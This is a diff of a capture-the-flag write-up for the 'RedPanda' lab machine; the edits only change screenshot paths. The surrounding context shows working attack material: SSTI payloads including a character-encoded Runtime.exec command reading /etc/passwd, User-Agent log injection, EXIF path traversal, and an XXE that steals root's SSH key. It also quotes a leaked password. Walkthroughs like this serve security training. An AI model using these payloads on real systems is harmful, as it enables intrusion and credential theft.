@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.11.170
 ```
 
-![ping](redpanda_01_ping.png)
+![ping](screenshots/redpanda_01_ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -66,7 +66,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.170 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![nmap all ports](redpanda_02_nmap_all_tcp.png)
+![nmap all ports](screenshots/redpanda_02_nmap_all_tcp.png)
 
 Extract open ports:
 
@@ -74,7 +74,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractPorts](redpanda_03_extractports.png)
+![extractPorts](screenshots/redpanda_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -92,7 +92,7 @@ nmap -p22,8080 -sC -sV 10.10.11.170 -oN targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted](redpanda_04_nmap_targeted.png)
+![targeted](screenshots/redpanda_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -103,7 +103,7 @@ nmap -p22,8080 -sC -sV 10.10.11.170 -oN targeted
 
 The OS presents as **Ubuntu Focal** (e.g. via **Launchpad** or `/etc/os-release` once access is available):
 
-![OS hint](redpanda_05_os_ubuntu_focal.png)
+![OS hint](screenshots/redpanda_05_os_ubuntu_focal.png)
 
 Fingerprint the web application:
 
@@ -111,7 +111,7 @@ Fingerprint the web application:
 whatweb http://10.10.11.170:8080
 ```
 
-![whatweb](redpanda_06_whatweb_8080.png)
+![whatweb](screenshots/redpanda_06_whatweb_8080.png)
 
 ---
 ### 1.4 Web Application
@@ -122,25 +122,25 @@ The site exposes a **search** box. Submitting input reflects **â€œYou search
 curl -i "http://10.10.11.170:8080/"
 ```
 
-![web home](redpanda_07_web_search_home.png)
+![web home](screenshots/redpanda_07_web_search_home.png)
 
 Searching for **`test`** shows the reflection clearly:
 
-![search test](redpanda_08_search_reflected_test.png)
+![search test](screenshots/redpanda_08_search_reflected_test.png)
 
 Searching for a **space** yields no image matches:
 
-![search space](redpanda_09_search_space_no_matches.png)
+![search space](screenshots/redpanda_09_search_space_no_matches.png)
 
 Searching for **`a`** lists images whose metadata contains the letter:
 
-![search a](redpanda_10_search_letter_a_results.png)
+![search a](screenshots/redpanda_10_search_letter_a_results.png)
 
 The **author** link shows user profiles (**woodenk**, **damian**) and uploaded **`.jpg`** filenames. The **export** returns **XML** with view statistics (relevant later for **XXE**):
 
-![author profile](redpanda_11_author_profile_users.png)
+![author profile](screenshots/redpanda_11_author_profile_users.png)
 
-![export xml](redpanda_12_export_stats_xml.png)
+![export xml](screenshots/redpanda_12_export_stats_xml.png)
 
 ---
 ## 2. Service Enumeration
@@ -164,7 +164,7 @@ Using **PayloadsAllTheThings**-style probes, several classic **SSTI** forms are 
 {7*7}
 ```
 
-![SSTI braces no eval](redpanda_13_ssti_braces_no_eval.png)
+![SSTI braces no eval](screenshots/redpanda_13_ssti_braces_no_eval.png)
 
 A **`${...}`** form is blocked or mangled (**`$`** is problematic in this template context):
 
@@ -172,7 +172,7 @@ A **`${...}`** form is blocked or mangled (**`$`** is problematic in this templa
 ${7*7}
 ```
 
-![SSTI dollar filtered](redpanda_14_ssti_dollar_filtered.png)
+![SSTI dollar filtered](screenshots/redpanda_14_ssti_dollar_filtered.png)
 
 A **`#{...}`** form also fails to show **`49`** as expected here:
 
@@ -180,7 +180,7 @@ A **`#{...}`** form also fails to show **`49`** as expected here:
 #{7*7}
 ```
 
-![SSTI hash no eval](redpanda_15_ssti_hash_no_eval.png)
+![SSTI hash no eval](screenshots/redpanda_15_ssti_hash_no_eval.png)
 
 With a leading **`*`** (**Thymeleaf** selection expression), the product evaluates cleanly:
 
@@ -188,7 +188,7 @@ With a leading **`*`** (**Thymeleaf** selection expression), the product evaluat
 *{7*7}
 ```
 
-![SSTI asterisk eval 49](redpanda_16_ssti_asterisk_eval_49.png)
+![SSTI asterisk eval 49](screenshots/redpanda_16_ssti_asterisk_eval_49.png)
 
 This confirms **SSTI** in a **SpEL**-friendly context.
 
@@ -201,7 +201,7 @@ A naive **`Runtime.exec`**-style payload (with quoted paths) does not return **`
 *{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ```
 
-![SSTI exec simple failed](redpanda_17_ssti_exec_simple_failed.png)
+![SSTI exec simple failed](screenshots/redpanda_17_ssti_exec_simple_failed.png)
 
 A reliable approach uses **`org.apache.commons.io.IOUtils`** to read **`stdout`** from a **character-by-character** built command (no quotes in the payload):
 
@@ -209,7 +209,7 @@ A reliable approach uses **`org.apache.commons.io.IOUtils`** to read **`stdout`*
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
-![etc passwd](redpanda_18_ssti_ioutils_etc_passwd.png)
+![etc passwd](screenshots/redpanda_18_ssti_ioutils_etc_passwd.png)
 
 Automate arbitrary commands by generating the **`.concat(T(java.lang.Character).toString(ORD))...`** chain from the desired string (example script takes the command as an argument, **POST**s to `/search` as `name`, and strips HTML):
 
@@ -275,11 +275,11 @@ if __name__ == '__main__':
 python3 ssti_cmd.py "cat /home/woodenk/user.txt"
 ```
 
-![user flag RCE](redpanda_19_ssti_script_user_flag.png)
+![user flag RCE](screenshots/redpanda_19_ssti_script_user_flag.png)
 
 **Note:** A **reverse shell** via **netcat** may fail depending on egress and payload constraints; a **Python** helper is enough to read files and explore the filesystem.
 
-![netcat attempt](redpanda_20_netcat_reverse_failed.png)
+![netcat attempt](screenshots/redpanda_20_netcat_reverse_failed.png)
 
 ---
 ### 3.3 Discovering SSH Credentials
@@ -290,7 +290,7 @@ Process listing shows a **cron**-related path:
 python3 ssti_cmd.py "ps -faux"
 ```
 
-![ps aux](redpanda_21_ps_aux_cron_path.png)
+![ps aux](screenshots/redpanda_21_ps_aux_cron_path.png)
 
 Search application files for **`woodenk`**:
 
@@ -298,7 +298,7 @@ Search application files for **`woodenk`**:
 python3 ssti_cmd.py "grep -r woodenk /opt/panda_search/ 2>/dev/null"
 ```
 
-![grep woodenk](redpanda_22_grep_woodenk_source.png)
+![grep woodenk](screenshots/redpanda_22_grep_woodenk_source.png)
 
 Filter out **binary** and **`.jpg`** noise:
 
@@ -306,7 +306,7 @@ Filter out **binary** and **`.jpg`** noise:
 python3 ssti_cmd.py "grep -r woodenk /opt/panda_search/ 2>/dev/null" | grep -vE "jpg|Binary"
 ```
 
-![credentials in source](redpanda_23_maincontroller_credentials.png)
+![credentials in source](screenshots/redpanda_23_maincontroller_credentials.png)
 
 **MainController.java** exposes **SSH** credentials for user **`woodenk`** (password **`RedPandaRule`**). Validate over **SSH**:
 
@@ -314,7 +314,7 @@ python3 ssti_cmd.py "grep -r woodenk /opt/panda_search/ 2>/dev/null" | grep -vE 
 ssh woodenk@10.10.11.170
 ```
 
-![ssh woodenk](redpanda_24_ssh_woodenk_shell.png)
+![ssh woodenk](screenshots/redpanda_24_ssh_woodenk_shell.png)
 
 ðŸ **User flag obtained**
 
@@ -337,7 +337,7 @@ while true; do
 done
 ```
 
-![homemade pspy](redpanda_25_homemade_pspy_root_job.png)
+![homemade pspy](screenshots/redpanda_25_homemade_pspy_root_job.png)
 
 **`/opt/panda_search/redpanda.log`** is written by the web app. Locating references leads to **`App.java`** (package **`com.logparser`**):
 
@@ -345,7 +345,7 @@ done
 grep -r "redpanda.log" /opt/panda_search/ 2>/dev/null
 ```
 
-![grep redpanda log](redpanda_26_grep_redpanda_log_references.png)
+![grep redpanda log](screenshots/redpanda_26_grep_redpanda_log_references.png)
 
 The cron-invoked **Java** program:
 
@@ -354,9 +354,9 @@ The cron-invoked **Java** program:
 - Reads the **JPEG** at **`/opt/panda_search/src/main/resources/static` + `uri`**, extracts **EXIF** **`Artist`**.  
 - Updates **`/credits/<Artist>_creds.xml`** via **JDOM2** (`addViewTo`).
 
-![App.java log parsing](redpanda_27_app_java_log_parser.png)
+![App.java log parsing](screenshots/redpanda_27_app_java_log_parser.png)
 
-![App.java isImage](redpanda_28_app_java_isimage_jpg.png)
+![App.java isImage](screenshots/redpanda_28_app_java_isimage_jpg.png)
 
 **Log line shape** (example):
 
@@ -373,11 +373,11 @@ Because **`user_agent`** is taken from the **HTTP User-Agent** header, we can in
 curl -s -X GET -A "test" http://10.10.11.170:8080/
 ```
 
-![curl user-agent test](redpanda_29_curl_user_agent_log_line.png)
+![curl user-agent test](screenshots/redpanda_29_curl_user_agent_log_line.png)
 
 The log reflects the injected structure:
 
-![log four fields](redpanda_30_redpanda_log_four_fields.png)
+![log four fields](screenshots/redpanda_30_redpanda_log_four_fields.png)
 
 ---
 ### 4.3 Path Traversal via EXIF Artist
@@ -388,7 +388,7 @@ Set **`Artist`** to a **path traversal** pointing under **`/tmp`** (example **`t
 exiftool -Artist=../../../../../../../../tmp/test test.jpg
 ```
 
-![exiftool Artist](redpanda_31_exiftool_artist_path_traversal.png)
+![exiftool Artist](screenshots/redpanda_31_exiftool_artist_path_traversal.png)
 
 Host **`test.jpg`** for download onto the box, and create **`/tmp/test_creds.xml`** (world-writable permissions for reliability):
 
@@ -396,11 +396,11 @@ Host **`test.jpg`** for download onto the box, and create **`/tmp/test_creds.xml
 chmod 777 /tmp/test_creds.xml
 ```
 
-![tmp staging](redpanda_32_tmp_staged_jpg_and_xml.png)
+![tmp staging](screenshots/redpanda_32_tmp_staged_jpg_and_xml.png)
 
 Craft **`test_creds.xml`** to mirror the **export** XML structure but include an **XXE** that exfiltrates **`/root/.ssh/id_rsa`** into an element (e.g. **`xxe`**):
 
-![XXE payload](redpanda_33_test_creds_xxe_id_rsa.png)
+![XXE payload](screenshots/redpanda_33_test_creds_xxe_id_rsa.png)
 
 Trigger a log line whose **`uri`** references **`/tmp/test.jpg`** using **`User-Agent`** injection:
 
@@ -408,7 +408,7 @@ Trigger a log line whose **`uri`** references **`/tmp/test.jpg`** using **`User-
 curl -s -X GET -A "test||/../../../../../../../../tmp/test.jpg" http://10.10.11.170:8080/
 ```
 
-![curl URI to tmp jpg](redpanda_34_curl_uri_tmp_test_jpg.png)
+![curl URI to tmp jpg](screenshots/redpanda_34_curl_uri_tmp_test_jpg.png)
 
 The **cron** job processes **`redpanda.log`** periodically (roughly **once per minute** in testing). After it runs, **`/tmp/test_creds.xml`** updates and the **XXE** output appears in the fileâ€”revealing **rootâ€™s** private key.
 
@@ -419,7 +419,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.170
 ```
 
-![ssh root](redpanda_35_ssh_root_key_root_flag.png)
+![ssh root](screenshots/redpanda_35_ssh_root_key_root_flag.png)
 
 ðŸ **Root flag obtained**
 
